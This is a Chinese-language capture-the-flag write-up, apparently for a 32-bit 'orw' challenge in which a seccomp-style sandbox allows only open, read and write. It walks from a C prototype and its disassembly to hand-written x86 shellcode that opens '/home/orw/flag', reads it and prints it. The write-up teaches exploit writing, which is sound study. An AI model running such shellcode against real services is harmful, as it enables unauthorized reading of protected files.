**第二题开始锻炼手写shellcode的能力了**

# 检查

![image.png](https://image.3001.net/images/20211111/1636636202_618d162a8311dc31f9624.png!small)  
32位，只有canary，然后进IDA看一下  
![image.png](https://image.3001.net/images/20211111/1636636248_618d16580945d8118a73c.png!small)  
![image.png](https://image.3001.net/images/20211111/1636636257_618d1661eb31c40bff596.png!small)  
很明显这是想让我们输入shellcode并且进行执行。题目中说了只能使用open、read、write三个系统调用。然后我们可以考虑通过open出flag然后进行读取。

第二个函数我也不太明白，但是我看大佬的博文说正是这个函数限制了我们使用其它的函数调用，其实就是一个沙箱

# shellcode

这道题主要考察的是shellcode的编写能力

我们先来了解一下这三个系统调用：

  1. open(path,0,0)  
我们可以用这种方式来打开一个文件，然后返回一个文件描述符

  2. read(fd,buf,number)  
第一个参数是一个文件描述符，然后是一个存放字符串的地址，最后是存放字符的个数

  3. write(fd,buf,number)  
第一个参数是文件描述符，然后是输出字符串的地址，输出的个数

首先来写一个C语言的程序

    
    
    #include <stdio.h>
    #include <unistd.h>
    int main(){
    	open("/home/orw/flag",0,0);
    	read(3,"/home/orw/flag",0x50);
    	write(1,"/home/orw/flag",0x50);
    	return 0;
    }
    

编译以后来看汇编语句，然后我们直接照猫画虎就好

    
    
    0x804849a <main+20>    add    ebx, 0x1b66
       0x80484a0 <main+26>    sub    esp, 4
       0x80484a3 <main+29>    push   0
       0x80484a5 <main+31>    push   0
       0x80484a7 <main+33>    lea    eax, [ebx - 0x1a80]
       0x80484ad <main+39>    push   eax
       0x80484ae <main+40>    call   open@plt <open@plt>
       
       0x80484b3 <main+45>    add    esp, 0x10
     ► 0x80484b6 <main+48>    sub    esp, 4
       0x80484b9 <main+51>    push   0x50
       0x80484bb <main+53>    lea    eax, [ebx - 0x1a80]
       0x80484c1 <main+59>    push   eax
       0x80484c2 <main+60>    push   3
       0x80484c4 <main+62>    call   read@plt <read@plt>
       
       0x80484c9 <main+67>    add    esp, 0x10
     ► 0x80484cc <main+70>    sub    esp, 4
       0x80484cf <main+73>    push   0x50
       0x80484d1 <main+75>    lea    eax, [ebx - 0x1a80]
       0x80484d7 <main+81>    push   eax
       0x80484d8 <main+82>    push   1
       0x80484da <main+84>    call   write@plt <write@plt>
    

然后我们来写一下shellcode

    
    
    mov eax,0x5    
    xor ecx,ecx
    push ecx
    push 0x67616c66 
    push 0x2f2f2f77 
    push 0x726f2f65 
    push 0x6d6f682f
    mov ebx,esp
    xor ecx,ecx
    xor edx,edx
    int 0x80
    
    mov eax,0x3     
    mov ecx, ebx
    mov ebx, 0x3
    mov edx, 0x50
    int 0x80
    
    mov eax,0x4     
    mov ebx,0x1
    mov edx,0x50
    int 0x80
    

然后将shellcode传上去就可以了。为什么read的文件描述符是3呢？因为open返回的文件描述符是可用文件描述符中最小的那一个，打开一个文件自动打开0，1，2，对应着标准输入、标准输出、标准报错，所以read的文件描述符应该是3

 **太顶了，调试了好多次，还借鉴了好多大佬的shellcode，最后自己写了一遍**

